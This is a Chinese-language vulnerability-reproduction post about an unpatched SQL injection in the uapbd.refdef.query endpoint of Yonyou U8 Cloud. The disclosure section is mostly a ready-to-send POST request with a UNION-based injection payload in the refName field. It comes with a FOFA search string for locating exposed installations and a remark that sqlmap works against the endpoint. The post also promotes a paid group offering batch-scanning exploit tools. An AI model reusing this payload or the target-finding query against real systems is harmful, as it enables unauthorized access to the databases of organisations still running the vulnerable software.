#  用友U8 Cloud uapbd.refdef.query接口存在SQL注入漏洞 附POC   
2024-11-7更新  南风漏洞复现文库   2024-11-07 23:06  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 用友U8 Cloud 简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
用友网络是全球领先的企业与公共组织软件、云服务、金融服务提供商。提供营销、制造、财务、人力等产品与服务，帮助客户实现发展目标，进而推动商业和社会进步。  
## 2.漏洞描述  
  
用友U8 Cloud是用友推出的大型企业数字化平台。用友U8 Cloud uapbd.refdef.query接口存在SQL注入漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
title=="U8C"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3avLLULj7gXuaxN8PABaicZTqjkS9dficWwmQxhBB9DHiaicjMyRhdosgWAibX1KA0Eln4ibekPpduDHI0g/640?wx_fmt=png&from=appmsg "null")  
  
用友U8 Cloud uapbd.refdef.query接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
title=="U8C"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N  
  
漏洞数据包：  
```
POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Content-Type: application/json
Content-Length: 64

{"refName":"1%' UNION ALL SELECT 1,CONVERT(INT,@@VERSION),1-- "}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3avLLULj7gXuaxN8PABaicZT65xibibhp7sr4KNs3oib6QYrTEibpm8lnqzmMUeTd4KY3sRVql3gq2uUnQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
可以跑sqlmap  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3avLLULj7gXuaxN8PABaicZT36pXuEiarmx5mQIwdnY2J5sYOYrDSZU7C06zxsjUicticb8bJ4fwIumbg/640?wx_fmt=png&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3avLLULj7gXuaxN8PABaicZT6j11tC6ibAWkY5TiaICicnaiaiciby2vtysySJWyWALibVVT3GdwaD2ooQshQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3avLLULj7gXuaxN8PABaicZTytW9nwHuPOZ6mVJaT9bOgDj3MO7f0JWu57PCbrEj62jdtqWDgBrrSQ/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3avLLULj7gXuaxN8PABaicZTm1yzibH4yTq1iaFb4dl0XtMHCmHN4uORQ1O3702iaKzYLnqzQq0rVMyBA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3avLLULj7gXuaxN8PABaicZTkLUSoo4drPn7dJXyjcbKjlzI2icdbtKoEu95tapujRZWFIF84YKBIqA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3avLLULj7gXuaxN8PABaicZTmwvA1u1jZ5ocofsOhQYUPiaNLxjkicDO6ZlMOPgNFZfOMP08ib5ZbTwJA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3avLLULj7gXuaxN8PABaicZTYlS6Eib7tGEKkAUWGsTN6ORq9ibSSW8f2jdRgRDJjZRl7bHlKc2afIpg/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
厂商尚未提供漏洞修复方案，请关注厂商主页更新： https://www.yonyou.com/  
## 8.往期回顾  
  
  
[东胜物流软件AttributeAdapter.aspx接口存在SQL注入漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487698&idx=1&sn=7b6ffc442157b482856dc14161c6639f&chksm=974b9dd5a03c14c3cf5c949514fab1b629d55adfee56ab6ddd39aa3b5d572ab2e951276af74d&scene=21#wechat_redirect)  
  
  
[用友NC Cloud service/esnserver接口存在任意文件上传漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487685&idx=1&sn=513f6f10d762dfcbd9844d6fbb7a78f1&chksm=974b9dc2a03c14d488f5b5b743223e5c2b407192ad4ebef39bf44f95afe822a35bfc38f8a03f&scene=21#wechat_redirect)  
  
  
